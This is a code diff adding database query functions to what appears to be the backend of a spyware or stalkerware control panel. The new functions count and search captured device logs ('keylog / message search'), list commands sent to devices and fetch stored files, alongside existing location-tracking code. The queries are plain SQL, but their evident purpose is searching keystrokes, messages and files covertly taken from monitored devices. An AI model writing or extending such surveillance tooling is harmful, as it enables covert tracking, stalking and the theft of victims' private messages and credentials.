@@ -213,6 +213,74 @@ def location_track(device_id, limit=500):
     return out
 
 
+def log_counts(device_id=None, since=None):
+    """Number of events per kind - used by the dashboard stat tiles."""
+    where, args = [], []
+    if device_id:
+        where.append("device_id = %s")
+        args.append(device_id)
+    if since:
+        where.append("ts >= %s")
+        args.append(since)
+    clause = ("WHERE " + " AND ".join(where)) if where else ""
+    conn = _connect()
+    cur = conn.cursor()
+    cur.execute(_q(f"SELECT kind, COUNT(*) AS n FROM logs {clause} GROUP BY kind"), tuple(args))
+    out = {r["kind"]: r["n"] for r in _fetchall(cur)}
+    conn.close()
+    return out
+
+
+def search_logs(device_id=None, kind=None, search=None, since=None, limit=200):
+    """Logs with a full-text filter over the payload (keylog / message search)."""
+    where, args = [], []
+    if device_id:
+        where.append("device_id = %s")
+        args.append(device_id)
+    if kind:
+        where.append("kind = %s")
+        args.append(kind)
+    if search:
+        where.append("payload LIKE %s")
+        args.append(f"%{search}%")
+    if since:
+        where.append("ts >= %s")
+        args.append(since)
+    clause = ("WHERE " + " AND ".join(where)) if where else ""
+    args.append(limit)
+    conn = _connect()
+    cur = conn.cursor()
+    cur.execute(_q(f"SELECT * FROM logs {clause} ORDER BY ts DESC LIMIT %s"), tuple(args))
+    out = _fetchall(cur)
+    conn.close()
+    return out
+
+
+def command_history(device_id=None, limit=50):
+    where, args = [], []
+    if device_id:
+        where.append("device_id = %s")
+        args.append(device_id)
+    clause = ("WHERE " + " AND ".join(where)) if where else ""
+    args.append(limit)
+    conn = _connect()
+    cur = conn.cursor()
+    cur.execute(_q(f"SELECT * FROM commands {clause} ORDER BY id DESC LIMIT %s"), tuple(args))
+    out = _fetchall(cur)
+    conn.close()
+    return out
+
+
+def get_file(file_id):
+    conn = _connect()
+    cur = conn.cursor()
+    cur.execute(_q("SELECT * FROM files WHERE id = %s"), (file_id,))
+    row = cur.fetchone()
+    out = dict(zip([d[0] for d in cur.description], row)) if row else None
+    conn.close()
+    return out
+
+
 def list_files(device_id=None, limit=100):
     conn = _connect()
     cur = conn.cursor()
